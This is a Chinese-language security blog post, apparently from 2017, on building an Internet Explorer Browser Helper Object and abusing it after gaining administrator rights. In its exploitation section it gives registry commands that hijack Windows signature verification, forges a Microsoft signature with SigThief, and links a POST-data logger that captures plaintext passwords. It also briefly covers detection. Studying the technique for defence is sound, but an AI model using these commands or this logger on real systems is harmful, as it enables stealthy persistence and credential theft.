@@ -1,0 +1,254 @@
+<article class="post">
+  <h1>利用BHO实现IE浏览器劫持</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>本文源于一个隐蔽连接的测试，模拟IE浏览器发起网络连接，能绕过某些防护产品拦截发起网络连接的第三方程序</p>
+
+<p>模拟IE浏览器发起网络连接的方法有很多种，其中，利用BHO劫持IE浏览器存在诸多优点(开放接口、简单高效、功能丰富等)，所以本文将要介绍BHO的开发和劫持利用思路</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>BHO简介</li>
+  <li>开发BHO</li>
+  <li>利用思路</li>
+  <li>实际测试</li>
+  <li>防御</li>
+</ul>
+
+<h2 id="0x02-bho简介">0x02 BHO简介</h2>
+<hr>
+
+<p>BHO，全称Browser Helper Object(浏览器辅助对象)</p>
+
+<p>微软推出的作为浏览器对第三方程序员开放交互接口的业界标准</p>
+
+<p>BHO的作用：</p>
+
+<ul>
+  <li>获取浏览器行为，如“后退”、“前进”、“当前页面”等</li>
+  <li>控制浏览器行为，如修改替换浏览器工具栏，添加自己的程序按钮等</li>
+</ul>
+
+<p>BHO依托于浏览器主窗口, 与浏览器实例生命周期一致，即浏览器页面打开时BHO对象运行，页面关闭时随之结束</p>
+
+<p>使用BHO时需要注册，相当于写入注册表，位于<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper\ Objects\{GUID}</code>和<code class="language-plaintext highlighter-rouge">HKEY_CLASSES_ROOT\CLSID\{GUID}</code></p>
+
+<h2 id="0x03-开发bho">0x03 开发BHO</h2>
+<hr>
+
+<p>本节仅作简要介绍</p>
+
+<p>开发工具： VS2012</p>
+
+<h3 id="1生成dll">1、生成dll</h3>
+
+<p><code class="language-plaintext highlighter-rouge">新建</code>-<code class="language-plaintext highlighter-rouge">Visual C++</code>-<code class="language-plaintext highlighter-rouge">ATL</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">添加</code>-<code class="language-plaintext highlighter-rouge">类</code>-<code class="language-plaintext highlighter-rouge">ATL</code>-<code class="language-plaintext highlighter-rouge">ATL简单对象</code>，设定简称为<code class="language-plaintext highlighter-rouge">HelloWorldBHO</code>，选中<code class="language-plaintext highlighter-rouge">IObjectWithSite(IE对象支持)</code></p>
+
+<p>修改以下文件：</p>
+
+<ul>
+  <li>HelloWorldBHO.h</li>
+  <li>HelloWorldBHO.cpp</li>
+  <li>dllmain.cpp</li>
+  <li>HelloWorld.rgs</li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>详情可参考http://blog.csdn.net/feier7501/article/details/11266345</p>
+
+<p>helloworld.rgs内保存BHO的GUID，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/2-1.png" alt="Alt text"></p>
+
+<p>HelloWorldBHO.rgs内保存BHO的名称，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/2-2.png" alt="Alt text"></p>
+
+<p>helloworld.rc内的<code class="language-plaintext highlighter-rouge">CompanyName</code>代表发行者，<code class="language-plaintext highlighter-rouge">PRODUCTVERSION</code>代表版本，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/2-3.png" alt="Alt text"></p>
+
+<p><strong>注：</strong></p>
+
+<p>以上三个图对应下文加载项的显示信息</p>
+
+<p>HelloWorldBHO.cpp保存IE浏览器中不同事件对应的操作，这里仅介绍一段实例代码(详细代码参照开源工程)，实现当页面加载完成时，弹框显示当前URL，关键代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void STDMETHODCALLTYPE CHelloWorldBHO::OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL)  
+{  
+    BSTR url = pvarURL-&gt;bstrVal;
+	CComBSTR u(url);
+	// Retrieve the top-level window from the site.  
+    HWND hwnd;  
+    HRESULT hr = m_spWebBrowser-&gt;get_HWND((LONG_PTR*)&amp;hwnd);  
+    if (SUCCEEDED(hr))  
+    {  
+        MessageBox(0, u, L"the url is", MB_OK);
+    }  
+} 
+</code></pre></div></div>
+
+<p>编译生成helloworld.dll</p>
+
+<p><strong>注：</strong></p>
+
+<p>如果VS2012不是管理员权限，编译时提示无法注册，接下来可以手动注册</p>
+
+<h3 id="2注册dll">2、注册dll</h3>
+
+<p>需要管理员权限，命令如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsve32 helloworld.dll /s
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">/s</code>参数用来去掉注册成功的提示框</p>
+
+<p>相当于写入注册表，位于<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper\ Objects\{GUID}</code>和<code class="language-plaintext highlighter-rouge">HKEY_CLASSES_ROOT\CLSID\{GUID}</code></p>
+
+<p><strong>补充：</strong></p>
+
+<p>卸载dll：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>regsve32 helloworld.dll /s /u
+</code></pre></div></div>
+
+<p>或者删除对应的注册表键值</p>
+
+<h2 id="0x04-实际测试">0x04 实际测试</h2>
+<hr>
+
+<p>测试系统： Win 7x86 IE8</p>
+
+<p>打开IE浏览器，弹出对话框，显示当前URL，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/3-1.png" alt="Alt text"></p>
+
+<p>查看IE的加载项，位于<code class="language-plaintext highlighter-rouge">工具</code>-<code class="language-plaintext highlighter-rouge">管理加载项</code>，获得加载项信息，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/3-2.png" alt="Alt text"></p>
+
+<p>其中的名称、发行者、版本可通过前文的helloworld.rgs、HelloWorldBHO.rgs、helloworld.rc指定，文件日期对应dll的修改时间</p>
+
+<p>由于我们自己生成的dll没有微软签名，所以显示<code class="language-plaintext highlighter-rouge">未验证</code></p>
+
+<h2 id="0x05-利用思路">0x05 利用思路</h2>
+<hr>
+
+<h3 id="1伪造微软签名隐藏bho">1、伪造微软签名，隐藏BHO</h3>
+
+<p>向helloworld.dll添加微软的Authenticode签名，修改注册表劫持系统的签名验证功能，使签名生效</p>
+
+<p>可参考之前的文章： <a href="https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/">《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》</a></p>
+
+<p>需要使用Microsoft Corporation的签名，可在Office文件中获得，可用的路径： <code class="language-plaintext highlighter-rouge">C:\Program Files\Microsoft Office\Office14\URLREDIR.DLL</code></p>
+
+<p>使用SigThief添加签名，下载地址：</p>
+
+<p>https://github.com/secretsquirrel/SigThief</p>
+
+<p>参数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigthief.py -i "C:\Program Files\Microsoft Office\Office14\URLREDIR.DLL" -t helloworld.dll -o new.dll 
+</code></pre></div></div>
+
+<p>生成new.dll</p>
+
+<p>修改注册表，劫持签名签证功能：
+(管理员权限)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "DbgUiContinue" /f
+</code></pre></div></div>
+
+<p>注册dll，重新打开IE，查看加载项，验证通过，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/3-3.png" alt="Alt text"></p>
+
+<p><strong>注：</strong></p>
+
+<p>修改BHO的信息能够进一步隐藏BHO</p>
+
+<h3 id="2抓取浏览器post数据记录明文口令">2、抓取浏览器POST数据，记录明文口令</h3>
+
+<p>抓取浏览器POST数据的开源代码可从github获得，参考地址：</p>
+
+<p>https://github.com/liigo/bho</p>
+
+<p>在BeforeNavigate2事件前抓取浏览器的POST数据</p>
+
+<p>我在自己的工程中直接引用了其中的关键函数： <code class="language-plaintext highlighter-rouge">STDMETHODIMP CBhoApp::Invoke(DISPID dispidMember, REFIID riid, LCID lcid, WORD wFlags, DISPPARAMS *pDispParams, VARIANT *pvarResult, EXCEPINFO *pExcepInfo, UINT *puArgErr)</code></p>
+
+<p>添加函数声明，实现记录日志的功能</p>
+
+<p><strong>注：</strong></p>
+
+<p>GetTempPath获取当前系统的Temp目录，IE权限下实际的路径为<code class="language-plaintext highlighter-rouge">%Temp%\Low</code></p>
+
+<p>完整代码已开源，地址如下：</p>
+
+<p>https://github.com/3gstudent/IE-BHO-POSTdata-Logger</p>
+
+<p>抓取浏览器POST数据，能够获得用户输入的明文口令，例如github的登录密码，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-28/3-4.png" alt="Alt text"></p>
+
+<h3 id="3下载文件">3、下载文件</h3>
+
+<p>通过这种方式下载文件，防火墙软件的管理端显示下载文件的程序为IE浏览器，能够在一定程度上实现隐藏</p>
+
+<h3 id="4在ie页面注入js">4、在IE页面注入js</h3>
+
+<p>可参考以下开源工程做进一步修改：</p>
+
+<p>https://github.com/xiyiaoo/BHO</p>
+
+<p>本文不做进一步介绍</p>
+
+<h3 id="5补充">5、补充</h3>
+
+<p>默认BHO的权限为low，所以在操作上会有一些限制，如果通过其他方式获得了高权限，那么可供利用的方式会更多</p>
+
+<h2 id="0x06-防御检测">0x06 防御检测</h2>
+<hr>
+
+<p><strong>防御：</strong></p>
+
+<p>BHO利用的前提是需要获得系统的管理员权限</p>
+
+<p><strong>检测：</strong></p>
+
+<ul>
+  <li>查看IE浏览器中的加载项</li>
+  <li>查看IE进程加载的dll</li>
+</ul>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr>
+
+<p>本文介绍了IE浏览器辅助对象BHO的开发方法，分析了在获得系统管理员权限后的利用思路，部分利用技术点到为止</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on December 28, 2017
+  </div>
+
+  
+</article>
